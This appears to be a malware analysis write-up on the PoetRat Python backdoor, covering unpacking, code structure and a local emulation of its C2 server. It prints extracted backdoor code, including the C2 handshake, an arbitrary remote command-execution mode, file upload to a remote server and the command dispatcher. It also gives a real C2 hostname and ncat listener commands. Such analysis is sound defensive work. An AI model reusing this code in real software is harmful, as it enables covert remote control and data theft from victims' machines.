# PoetRat 2020-09-27
# TL;DR
It's a python based backdoor with functions to take screenshots, compress and upload files, download and execute, 
create registry keys/values. A [full list of commands](#command-executions) is available.

A quick manual c2 emulation was setup and provided [a pcap](c2_emulator/poetrat_c2_traffic.pcapng) taken during the emulation and the 
[required TLS key](c2_emulator/key.pem) to decrypt the traffic.

# Table of Contents
1. [References](#references)
    1. [Reference Sample](#hashes)
    1. [Write Ups](#writeups)
1. [Maldoc Dropper Analysis](#maldoc-dropper-analysis)
1. [Payload Analysis](#payload-analysis)
    1. [Unpacking](#unpacking)
    1. [High Level Overview](#high-level-overview)
        1. [starter.py](#starterpy)
        1. [milan.py](#milanpy)
            - [communcate function code execution method](#milanpy-communicate-function-code-execution-method)
        1. [fmilan.py](#fmilanpy)
            - [main function](#fmalanpy-main-function)
            - [connect function](#fmilanpy-connect-function-c2-handshake)
            - [communicate function](#fmilanpy-communicate-function)
            - [arbitrary execution mode](#-arbitrary-execution-mode)
            - [file_ready and waiting_file functions](#fmilanpy-file_ready-and-waiting_file-functions)
        1. [transfer.py](#transferpy)
            - [send_to_trasfersh function](#send_to_transfersh-function)
1. [C2 Emulation](#c2-emulation)
    1. [Modify Malware](#malware-modification)
    1. [C2 Emulation Setup](#c2-emulation-setup)
    1. [C2 Emulation](#c2-emulation)
        1. [Handshake Initialization](#handshake-initialization)
        1. [Handshake Completion](#handshake-completion)
        1. [Command Executions](#command-executions)
        1. [Completed Emulation](#completed-emulation)
    

# References

## Hashes
|algo|hash|
|----|----|
|md5|81f6232eec40898bd0ba0cc1601a82b3|
|sha1|be0c271f83112b07d55582b89a113dc8b3d5097d|
|sha256|64aeffe15aece5ae22e99d9fd55657788e71c1c52ceb08e3b16b8475b8655059|

## WriteUps
[Cisco Talos Apr 2020](https://blog.talosintelligence.com/2020/04/poetrat-covid-19-lures.html) -- [Archive Link](https://web.archive.org/web/20200919015201/https://blog.talosintelligence.com/2020/04/poetrat-covid-19-lures.html)  
[Cisco Talos Oct 2020](https://blog.talosintelligence.com/2020/10/poetrat-update.html) -- [Archive Link](https://web.archive.org/web/20201010004915/https://blog.talosintelligence.com/2020/10/poetrat-update.html)

## Sample Source
[Any.run](https://app.any.run/tasks/ff391358-9322-49e0-aa7a-d803e66090d0/)
[Virus Total](https://www.virustotal.com/gui/file/64aeffe15aece5ae22e99d9fd55657788e71c1c52ceb08e3b16b8475b8655059/details)
 
# Maldoc Dropper Analysis
TODO

# Payload Analysis
Payload was found as a zip file being writen to disk.  
![](images/payload_zip.png)

[milan.zip.zip](malware_lives_here/milan.zip.zip) - password `infected`

## Execution 
After the payload is unzipped, we can see the python script being started via the python binary.

![](images/execution.png)
 
## Unpacking
Samples were obfuscated with a simple base64 and lzma compression.  It was "unpacked" by simply changing
the `eval` statements to a `print` statement as seen here in the `affine.py` file 

### Unpacking process for `affine.py`
```python
# import lzma, base64
# exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AJOARtdADSbSme4UjxzyvJlul3o8NnG/omKNfwGajvM9oyUJqMRYLErc7qrrGgMOI5BKQbcMbsJbUjgBMFq2sOOq4hTaM3ob/vxLlIDmQ92tWSgRKZcPND6Iv14wslcrIc5LwB2dQYOR5ohDIRfGP5TvxeKgT7neyv9t9lMlJEG8G+trxG7sVS9RUtAXBZdE6IHIJyhl9ybzwOgK46TaHAJho3SaxtrkU9gCIvroO2C1Tzevhyc2RKDkuJX9QUnnsgmh6LDF+LPZtXPzXWh0b/LEdtFPsQdiaRuglFDw7GdPUSvr8QVXBiX7VdpZHptnddNHEbqUUr7c3HrvaUPmOTdgBVib+WEF7JBi+80BowHm23jvtm8SpfOjZn+OKPpPQAAAFNZSJho83ZiAAG3As8EAAD88n2XscRn+wIAAAAABFla')))
# Created by pyminifier (https://github.com/liftoff/pyminifier)

import lzma, base64
print(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AJOARtdADSbSme4UjxzyvJlul3o8NnG/omKNfwGajvM9oyUJqMRYLErc7qrrGgMOI5BKQbcMbsJbUjgBMFq2sOOq4hTaM3ob/vxLlIDmQ92tWSgRKZcPND6Iv14wslcrIc5LwB2dQYOR5ohDIRfGP5TvxeKgT7neyv9t9lMlJEG8G+trxG7sVS9RUtAXBZdE6IHIJyhl9ybzwOgK46TaHAJho3SaxtrkU9gCIvroO2C1Tzevhyc2RKDkuJX9QUnnsgmh6LDF+LPZtXPzXWh0b/LEdtFPsQdiaRuglFDw7GdPUSvr8QVXBiX7VdpZHptnddNHEbqUUr7c3HrvaUPmOTdgBVib+WEF7JBi+80BowHm23jvtm8SpfOjZn+OKPpPQAAAFNZSJho83ZiAAG3As8EAAD88n2XscRn+wIAAAAABFla')).decode())
```

## High Level Overview
There are two main scripts working within PoetRAT - `milan.py` and `fmilan.py`.  All variables, such as the C2 server 
details are stored within `constants.py`.  Major functions used by PoetRAT are stored within `milan_funcs.py`.  The 
script uses `starter.py` to first start `milan.py` and then `fmilan.py` five seconds later.     

The two main scripts conduct interprocess communication (IPC) by writing and reading to a file on disk.  The contents 
of the file are encrypted and decrypted using `Affine.py`.  An additional `.ready` file is created as well, which 
`fmilan.py` writes a `1` to when it is ready for `milan.py` to read the contents of the IPC file. 

## `starter.py`
`starter.py` is responsible for starting `milan.py` and `fmilan.py` along with persisting the UUID by writing it to a 
`.key` file and storing it (by string substitution) in the `constants.py`  

## `milan.py`
`milan.py` is responsible for reading the IPC file, running commands that were written to the IPC file, and writing the 
results of the commands back to the IPC file. 
 
The reading from the IPC file and execution of commands can be seen in the code snippet below. 

### `milan.py` communicate function code execution method
```python
cmd = aff.decrypt(open(pipe_out, "rb").read())
if len(cmd) > 2 and "$$" == cmd[0:2]:
    receiver, sender = multiprocessing.Pipe(False)
    process = multiprocessing.Process(target=work_on_cmd_process, name=cmd[2:], args=(cmd[2:], sender),
                                      daemon=True)
    processes.append({"process": process, "receiver": receiver, "data": "", "root": os.getcwd()})
    process.start()
else:
    resp = work_on_cmd(cmd)
```

## `fmilan.py`
`fmilan.py` is responsible for communication with the C2 server.  It receives the commands from the C2, and writes them 
to the IPC file, then waits for `milan.py` to write the results to the IPC file and then sends the results back to the 
C2 server.

### `fmalan.py` Main Function
The 83 second sleep within the main function can be removed to speed up analysis/interaction. As we move towards 
emulating the C2 server, this is a nice change to make to the malware. 

```python
def main():
    sleep(83)
    while wanted:
        try:
            waiting_file()
            if not is_connected():
                connect()
            communicate()
        except Exception as a:
            if is_connected():
                sock.send(str(a).encode())

```

### `fmilan.py` Connect function (c2 handshake)
```python
def connect():
    global sock
    while True:
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock = context.wrap_socket(s, server_hostname=host)
            sock.connect((host, port))
            sock.send("milan".encode())
            res = recv(5, True)
            if "who" in res:
                sock.send(f"""{getuser()}@{node()}-{guid}""".encode())
                res = recv(5, )
            if "fire" in res:
                break
        except Exception as e:
            open("wtf.log", "a+").write(str(e) + "\n\n")
            sleep(183)
```

 
### `fmilan.py` Communicate Function
After the handshake is completed, `fmilan.py` moves onto the `communicate` function.  Below we can see that it reads 
from the IPC file (`pipe_out`), decrypts the contents and sends it to the C2 server. 

```python
def communicate():
    global wanted
    aff = Affine()
    try:
        d = open(pipe_out, "rb").read()
        d = aff.decrypt(d)
        if len(d) == 0:
            d = "EMPTY"
        sock.send(d.encode())
        res = recv(4028, True)
        it = open(pipe_out, "wb")
        if res.rstrip() == "exit":
            wanted = False
        elif res.rstrip() == "dis":
            it.close()
            sys.exit(0)
        elif res.rstrip() == "##":
            while res.rstrip() != "exit":
                res = recv(4028, True)
                sock.send(run_cmd(res.rstrip()).encode())
            return
        it.truncate(0)
        res = aff.encrypt(res)
        it.write(res)
        it.close()
        file_ready()
    except ConnectionResetError:
        sock.close()
    except Exception as e:
        if is_connected():
            sock.send("An error has occurred: {}".format(str(e)).encode())
```
### `##` arbitrary execution mode
There is one condition that, when met, allows the `fmilan.py` script to function as it's own backdoor, not depending on 
the `milan.py` script to pickup the commands written to the IPC file. 
If the C2 server sends `##` to the malware, `fmilan.py` will run any of the commands directly on the host and return 
the output to the C2 server.  
It will remain in this state until the C2 server sends the `exit` command.

### `fmilan.py` "file_ready" and "waiting_file" Functions
```python
def file_ready():
    open(pipe_out + ".ready", "w+").write('1')


def waiting_file():
    count = 1000
    while open(pipe_out + ".ready", "r").read() != '0' and count > 0:
        sleep(0.5)
        count -= 1
```

## `transfer.py`

### `send_to_transfersh` Function
The `send_to_transfersh` is used, ultimately by the `transfer` function, which in turn gets used by the `upload` 
and the `shot` (via call to upload) functions.
 
Within this function, the use of the `Max-Downloads` and `Max-Days` Headers combined with the lack of TLS, can easily 
be used to create network signatures.

```python
def send_to_transfersh(file, days, mD):
    global output
    """
       send file to transfersh, retrieve download link, and copy it to clipboard
       :param file: absolute path to file
       :return: download_link
       """
    size_of_file = get_size(file)
    file_name = os.path.basename(file)
    output += "\nSending file: {} (size of the file: {} MB)".format(file_name, size_of_file)
    url = "http://" + constants.host + ":" + str(constants.th_port)
    file = {'{}'.format(file): open(file, 'rb')}
    head = {"Max-Downloads": str(mD), "Max-Days": str(days), }
    response = requests.post(url, files=file, headers=head)
    download_link = response.content.decode('utf-8')
    output += "\nLink to download file (will be saved till {}. Download Limit: {}):\n\n{}".format(get_final_date(days),
                                                                                                  mD, download_link)
    return download_link
```
# C2 Emulation

As per the Cisco Talos writeup the C2 server is stored in the [`constants.py`](malware_lives_here/raw_files/milan_zip/constants.py).  We can modify this value to point to our 
C2 server.  Below I've changed the host and port

## Malware Modification
the `contstants.py` file is modified use 127.0.0.1 as the C2 server.
```python
import os
import sys

#host = "slimip.accesscam.org"
host = "127.0.0.1"
#port = 80
port = 9999
fold = os.path.abspath(os.path.dirname(sys.argv[0])) + "\\"
pipe_out = fold + "Division42"
guid = "GUID_KEY"
th_port = 8080
```

## C2 Emulation Setup
As `fmilan.py` makes a TLS socket connection to the c2 [within the `connect` function](#fmilanpy-connect-function) I 
created a self signed cert and spun up a ncat listener.

```bash
$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes 
$ ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -l 9999
```

In order to support emulating downloading and uploading, I also spin up a 
[quick python http webserver](c2_emulator/quick_http_server.py) listening on port 8080
```bash
python quick_http_server.py
``` 

Additionally, I unzip all the files within `milan.zip` onto the victim machine and start two command windows
 
## C2 Emulation 
With everything running, I can now start the malware by calling `milan.py` and `fmilan.py` manually (replicating the) 
`starter.py` functions.

I've provided [a pcap](c2_emulator/poetrat_c2_traffic.pcapng) taken during the emulation and the 
[required TLS key](c2_emulator/key.pem) to decrypt the traffic.

### Handshake Initialization
Upon starting `fmilan.py` we can see the connection and the initial stage of the handshake occur when the malware sends 
the phrase `milan`  
![](images/emulation/handshake_1.png)

### Handshake Completion
We continue the handshake by replying with `who` and `fire` which drops gets `fmilan.py` out of the `connect` function.
We are then greeted by the `header` which drops us into a basic PoetRAT shell, where the commands suported by `milan.py` can be run 
via the `work_on_cmd` function. 

![](images/emulation/completed_handshake.png)
  
### Command Executions
Supported commands by can be found within the `execution` function of the `milan_funs.py` file
```python
def execution(com):
    args = shlex.split(com)
    cmd = args[0]
    args = args[1:]
    if cmd == "version":
        return "4.3"
    elif cmd == "ls":
        return ls(args)
    elif cmd == "cd":
        return chdir(args)
    elif cmd == "sysinfo":
        return get_sys_info()
    elif cmd == "download":
        return download_link(args)
    elif cmd == "upload":
        return upload(args)
    elif cmd == "shot":
        return shot(args)
    elif cmd == "cp":
        return copy_file_a(args)
    elif cmd == "mv":
        return move_file_a(args)
    elif cmd == "link":
        return create_link_a(args)
    elif cmd == "register":
        return register_a(args)
    elif cmd == "hide":
        return hide_file_a(args)
    elif cmd == "compress":
        return compress(args)
    elif cmd == "split":
        return split(args)
    elif cmd == "jobs":
        return jobs(args)
    elif cmd == "exit":
        return "exit"
    else:
        return run_cmd(com)[0]
```

#### Completed Emulation
For the Purposes of our c2 emulation, we'll just manually run a couple of the available commands
![](images/emulation/commands.png)

During the `shot` and `upload` commands you can see the data being transferred in the clear
![](images/emulation/shot_upload.png)
